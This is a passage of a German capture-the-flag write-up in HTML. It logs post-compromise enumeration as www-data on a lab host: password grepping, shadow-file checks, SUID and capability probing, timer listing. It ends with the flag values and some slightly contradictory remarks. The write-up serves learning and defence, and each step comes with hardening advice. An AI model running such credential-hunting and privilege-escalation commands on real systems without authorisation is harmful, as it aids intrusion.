+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird versucht, mit `find` und `grep` nach Dateien zu suchen, die das Wort "PASSWORD" (case-insensitive, ignoriert Binärdateien) enthalten. Das Log zeigt keine relevanten Funde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese spezifische Suche nach Passwörtern war erfolglos.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie umfassendere Suchmuster und durchsuchen Sie Konfigurationsdateien, Skripte und Home-Verzeichnisse gezielt. Prüfen Sie `sudo -l` und SUID-Binaries.<br><strong>Empfehlung (Admin):</strong> Speichern Sie keine Passwörter im Klartext in Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tagged:~/html$ <span class="command">ls /home/</span></div>
+                    <pre><span class="command">shyla</span>  <span class="command">uma</span></pre>
+                    <div class="prompt">www-data@tagged:~/html$ <span class="command">ls -la /etc/passwd</span></div>
+                    <pre>-rw-r--r-- 1 root root 1429 Nov 14 14:43 /etc/passwd</pre>
+                    <div class="prompt">www-data@tagged:~/html$ <span class="command">ls -la /etc/shadow</span></div>
+                    <pre>-rw-r----- 1 root <span class="command">shadow</span> 971 Nov 14 14:43 /etc/shadow</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Home-Verzeichnisse der Benutzer `<span class="command">shyla</span>` und `<span class="command">uma</span>` werden identifiziert. Die Berechtigungen von `/etc/passwd` sind normal (lesbar für alle). Die Berechtigungen von `/etc/shadow` sind ebenfalls Standard (nur für `root` und die Gruppe `shadow` lesbar).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Identifiziert potenzielle Benutzerkonten. Bestätigt, dass `/etc/shadow` nicht direkt von `www-data` gelesen werden kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Home-Verzeichnisse von `shyla` und `uma` (soweit Berechtigungen es zulassen). Versuchen Sie, Passwörter für diese Benutzer zu erraten oder zu knacken.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Home-Verzeichnisse angemessene Berechtigungen haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tagged:~/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+[...] <span class="password"># Standard SUID-Binaries</span>
+    <span class="command">15248    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo</span>
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Dateien wird erneut durchgeführt (oder hier zum ersten Mal detailliert gezeigt). Es werden hauptsächlich Standard-SUID-Binaries gefunden, darunter `/usr/bin/sudo`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine offensichtlichen ungewöhnlichen oder leicht ausnutzbaren SUID-Binaries gefunden. Der nächste Schritt wäre, `sudo -l` zu prüfen (was im Log fehlt).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus, um zu sehen, ob `www-data` irgendwelche `sudo`-Berechtigungen hat.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige SUID-Bits von Standard-Binaries, wenn möglich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@tagged:~/html$ <span class="command">printenv</span></div>
+                     <pre>
+PWD=/var/www/html
+HOME=/var/www <span class="password"><-- Ungewöhnliches Home für www-data</span>
+TERM=xterm-256color
+USER=www-data
+SHLVL=3
+LC_CTYPE=C.UTF-8
+_=/usr/bin/printenv
+</pre>
+                    <div class="prompt">www-data@tagged:~/html$ <span class="command">echo $PATH</span></div>
+                    <pre>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Umgebungsvariablen werden ausgegeben. Der `HOME`-Pfad für `www-data` ist auf `/var/www` gesetzt, was nicht Standard ist (normalerweise `/var/www` oder `/srv/www`). Der `PATH` enthält das aktuelle Verzeichnis (`.`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ungewöhnliche `HOME`-Verzeichnis ist eine Notiz wert, bietet aber keinen direkten Exploit. Der Punkt (`.`) im `PATH` kann unter bestimmten Umständen zu Schwachstellen führen, wenn Skripte oder SUID-Binaries Befehle ohne absoluten Pfad aufrufen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie den `PATH` für mögliche Hijacking-Angriffe, falls `sudo` oder SUID-Binaries relative Pfade verwenden.<br><strong>Empfehlung (Admin):</strong> Setzen Sie `HOME`-Verzeichnisse für Dienstbenutzer korrekt (oder auf nicht existierende Pfade). Entfernen Sie `.` aus dem `PATH` von Dienstbenutzern und Systemprozessen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@tagged:/tmp$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                    <pre>/usr/bin/ping cap_net_raw=ep</pre>
+                    <div class="prompt">www-data@tagged:/tmp$ <span class="command">capsh --drop=cap_net_raw --print -- -c "tcpdump"</span></div>
+                    <pre>unable to raise CAP_SETPCAP for BSET changes: Operation not permitted</pre>
+                    <div class="prompt">www-data@tagged:/tmp$ <span class="command">setcap -r /usr/bin/ping</span></div>
+                    <pre>unable to set CAP_SETFCAP effective capability: Operation not permitted</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird nach Linux Capabilities gesucht (`getcap`), nur `ping` hat die übliche `cap_net_raw`. Versuche, Capabilities zu manipulieren (`capsh`, `setcap`), scheitern wie erwartet, da `www-data` nicht die notwendigen Rechte (`CAP_SETPCAP`, `CAP_SETFCAP`) hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Capabilities bieten hier keinen Eskalationsweg.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine Aktion erforderlich.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tagged:/tmp$ <span class="command">ss --unix</span></div>
+                     <pre>[...] <span class="password"># Liste von Unix-Sockets, darunter /run/php/php7.4-fpm.sock</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `ss --unix` listet lokale Unix-Domain-Sockets auf. Unter anderem ist ein Socket für PHP-FPM (`php7.4-fpm.sock`) sichtbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zeigt, dass PHP wahrscheinlich über FPM läuft, was eine gängige Konfiguration für Nginx ist. Bietet aber keinen direkten Angriffspunkt von `www-data` aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine direkte Aktion.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Unix-Sockets korrekt berechtigt sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tagged:/tmp$ <span class="command">systemctl list-timers --all</span></div>
+                     <pre>
+NEXT                        LEFT          LAST                        PASSED   UNIT                         ACTIVATES
+Tue 2022-11-15 22:39:00 CET 7min left     Tue 2022-11-15 22:09:01 CET 21min ago anacron.timer                anacron.service
+Wed 2022-11-16 00:00:00 CET 1h 28min left Tue 2022-11-15 00:00:04 CET 22h ago   apt-daily.timer              apt-daily.service
+Wed 2022-11-16 00:00:00 CET 1h 28min left Tue 2022-11-15 00:00:04 CET 22h ago   dpkg-db-backup.timer         dpkg-db-backup.service
+Wed 2022-11-16 00:10:56 CET 1h 39min left Mon 2022-11-14 10:47:01 CET 1 day 11h fstrim.timer                 fstrim.service
+Wed 2022-11-16 06:53:40 CET 8h left       Tue 2022-11-15 21:51:31 CET 39min ago man-db.timer                 man-db.service
+Wed 2022-11-16 21:55:51 CET 23h left      Tue 2022-11-15 21:55:51 CET 35min ago motd-news.timer              motd-news.service
+Sun 2022-11-20 03:10:04 CET 4 days left   Mon 2022-11-14 10:47:01 CET 1 day 11h apt-daily-upgrade.timer      apt-daily-upgrade.service
+Mon 2022-11-21 00:35:36 CET 5 days left   Mon 2022-11-14 10:47:01 CET 1 day 11h systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> `systemctl list-timers --all` zeigt geplante Systemd-Timer an. Es sind nur Standard-Systemwartungs-Timer aktiv (anacron, apt, dpkg, fstrim, man-db, motd, tmpfiles-clean).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Systemd-Timer scheinen hier keinen Eskalationsweg zu bieten, da keine benutzerdefinierten oder unsicheren Timer sichtbar sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie auch traditionelle Cronjobs (`cat /etc/crontab /etc/cron.*/*`).<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich, da dies Standard-Timer sind.</p>
+
+             <p class="evaluation">**Abschließende Bewertung des Logs (Privilege Escalation):** Der Log endet nach der `www-data`-Enumeration. Der entscheidende Schritt zur Erlangung von Root-Rechten fehlt vollständig. Basierend auf dem Hinweis `nice ports,/Trinity.txt.bak` ist es *möglich*, dass der Weg über das Lesen dieser Datei führte, aber das Log zeigt nicht, *wie* `www-data` die nötigen Rechte (z.B. Root) erlangte, um diese Datei zu lesen oder wie diese Datei sonst zugänglich gemacht wurde.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="evaluation">Hinweis: Die folgenden Flags wurden am Ende des bereitgestellten Textes gefunden, jedoch ohne die zugehörigen Befehle zu ihrer Extraktion. Der Weg zur Root-Flag ist im Log nicht dokumentiert.</p>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">g0disah4ck3r</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt / Trinity.txt.bak ?</div>
+                    <div class="flag-value"><span class="password">HMVrep0rtz!</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. November 2022</p> <!-- Korrektes Datum aus Nmap/Nikto extrahiert -->
+    </footer>
+</body>
+</html>
